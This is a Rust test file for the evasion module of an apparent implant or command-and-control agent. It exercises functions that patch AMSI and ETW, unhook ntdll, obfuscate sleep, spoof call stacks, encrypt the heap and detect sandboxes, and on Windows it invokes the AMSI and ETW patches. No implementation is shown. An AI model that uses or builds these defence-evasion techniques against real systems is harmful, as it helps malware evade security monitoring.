// tests/test_evasion.rs
//
// Integration tests for crate::agent::evasion.
//
// Tests run against the public API as re-exported through evasion/mod.rs
// to verify that the module split did not break any symbols, change any
// documented behaviour, or introduce regressions in the cross-module
// invariants established during the refactor.
//
// IMPORTANT — heap encryption functions are intentionally NOT called here:
// encrypt_heap / encrypt_heap_aes256gcm walk the live process heap via
// HeapLock + HeapWalk.  Invoking them inside the test runner would encrypt
// the test framework's own allocations and either crash the process or
// deadlock on the allocator lock.  Their mathematical properties are
// already covered by the isolated-buffer tests in evasion/heap.rs.

use rcm::agent::evasion;

// ─────────────────────────────────────────────────────────────────────────────
// Symbol availability
//
// Each test calls exactly the symbols that mod.rs re-exports.  If any pub use
// entry is missing the test will fail to compile, immediately surfacing the gap.
// ─────────────────────────────────────────────────────────────────────────────

#[test]
fn detection_symbols_resolve() {
    let _ = evasion::is_virtualized();
    let _ = evasion::is_bad_parent(&[]);
    // run_decoy() is intentionally not called — it calls std::process::exit(1).
}

#[test]
fn patching_symbols_resolve() {
    // All three return Result; just verify they resolve and return a value.
    let _ = evasion::patch_amsi();
    let _ = evasion::patch_etw();
    let _ = evasion::unhook_ntdll();
}

#[test]
fn sleep_symbols_resolve() {
    let _ = evasion::agent_text_section();
    evasion::ekko_sleep(0);             // 0 ms — immediate early return
    evasion::sleep_with_spoofed_stack(0); // 0 ms — immediate
}

// ─────────────────────────────────────────────────────────────────────────────
// Cross-module invariants
// ─────────────────────────────────────────────────────────────────────────────

// The permissive-by-default invariant must hold at the module boundary:
// an agent built without a valid_parents config must never self-terminate.
#[test]
fn empty_parent_allowlist_is_always_permissive() {
    assert!(!evasion::is_bad_parent(&[]));
    assert!(!evasion::is_bad_parent(&Vec::new()));
}

// is_virtualized must be side-effect-free — repeated calls agree.
#[test]
fn is_virtualized_is_idempotent() {
    assert_eq!(evasion::is_virtualized(), evasion::is_virtualized());
}

// ─────────────────────────────────────────────────────────────────────────────
// Non-Windows cross-module behaviour
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(not(target_os = "windows"))]
#[test]
fn patching_functions_all_return_err_on_non_windows() {
    assert!(evasion::patch_amsi().is_err(),   "patch_amsi should err");
    assert!(evasion::patch_etw().is_err(),    "patch_etw should err");
    assert!(evasion::unhook_ntdll().is_err(), "unhook_ntdll should err");
}

#[cfg(not(target_os = "windows"))]
#[test]
fn patching_errors_contain_windows_only_message() {
    for (name, result) in [
        ("patch_amsi",   evasion::patch_amsi()),
        ("patch_etw",    evasion::patch_etw()),
        ("unhook_ntdll", evasion::unhook_ntdll()),
    ] {
        let msg = result.unwrap_err();
        assert!(
            msg.contains("Windows only"),
            "{name} error should say 'Windows only', got: {msg}"
        );
    }
}

#[cfg(not(target_os = "windows"))]
#[test]
fn heap_stubs_return_ok_zero_on_non_windows() {
    assert_eq!(evasion::encrypt_heap(&[0u8; 16]).unwrap(),              0);
    assert_eq!(evasion::decrypt_heap(&[0u8; 16]).unwrap(),              0);
    assert_eq!(evasion::encrypt_heap_aes256gcm(&[0u8; 32], &[0u8; 12]).unwrap(), 0);
    assert_eq!(evasion::decrypt_heap_aes256gcm(&[0u8; 32], &[0u8; 12]).unwrap(), 0);
}

#[cfg(not(target_os = "windows"))]
#[test]
fn suspend_resume_round_trip_is_safe_on_non_windows() {
    // On non-Windows these are no-ops; the important thing is they
    // do not panic and the round-trip completes.
    let handles = evasion::suspend_other_threads();
    assert!(handles.is_empty(), "non-Windows suspend must return empty vec");
    evasion::resume_threads(handles); // must not panic on empty input
}

#[cfg(not(target_os = "windows"))]
#[test]
fn agent_text_section_returns_none_on_non_windows() {
    assert!(evasion::agent_text_section().is_none());
}

#[cfg(not(target_os = "windows"))]
#[test]
fn parent_check_non_windows_is_always_permissive_with_any_list() {
    let list = vec![
        "explorer.exe".to_string(),
        "svchost.exe".to_string(),
        "winlogon.exe".to_string(),
    ];
    // Non-Windows stub returns false regardless of the list contents.
    assert!(!evasion::is_bad_parent(&list));
}

// ─────────────────────────────────────────────────────────────────────────────
// Sleep timing (platform-agnostic)
// ─────────────────────────────────────────────────────────────────────────────

#[test]
fn ekko_sleep_zero_is_immediate() {
    use std::time::{Duration, Instant};
    let t = Instant::now();
    evasion::ekko_sleep(0);
    assert!(
        t.elapsed() < Duration::from_secs(1),
        "ekko_sleep(0) must return immediately, took {:?}", t.elapsed()
    );
}

#[test]
fn sleep_with_spoofed_stack_zero_is_immediate() {
    use std::time::{Duration, Instant};
    let t = Instant::now();
    evasion::sleep_with_spoofed_stack(0);
    assert!(
        t.elapsed() < Duration::from_secs(1),
        "sleep_with_spoofed_stack(0) must return immediately, took {:?}", t.elapsed()
    );
}

// ─────────────────────────────────────────────────────────────────────────────
// Windows-specific integration paths
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
#[test]
fn agent_text_section_is_consistent_with_itself() {
    // Two calls should return the same base address and size — the PE
    // header walk is deterministic for a loaded image.
    let a = evasion::agent_text_section();
    let b = evasion::agent_text_section();
    assert_eq!(a, b, ".text section should be deterministic");
}

#[cfg(target_os = "windows")]
#[test]
fn agent_text_section_is_some_and_plausible() {
    let (ptr, size) = evasion::agent_text_section()
        .expect("should find .text in test binary");
    assert!(!ptr.is_null());
    assert!(size > 1024, ".text should be > 1 KiB, got {size}");
    assert!(size < 512 * 1024 * 1024, ".text implausibly large: {size}");
}

#[cfg(target_os = "windows")]
#[test]
fn patching_functions_return_ok_or_meaningful_err_on_windows() {
    // On a real Windows host these should succeed.  We accept Err too
    // because a CI VM might restrict VirtualProtect.
    for (name, r) in [
        ("patch_amsi", evasion::patch_amsi()),
        ("patch_etw",  evasion::patch_etw()),
    ] {
        match r {
            Ok(msg) => assert!(!msg.is_empty(), "{name} Ok message should not be empty"),
            Err(e)  => assert!(!e.is_empty(),   "{name} Err message should not be empty"),
        }
    }
}
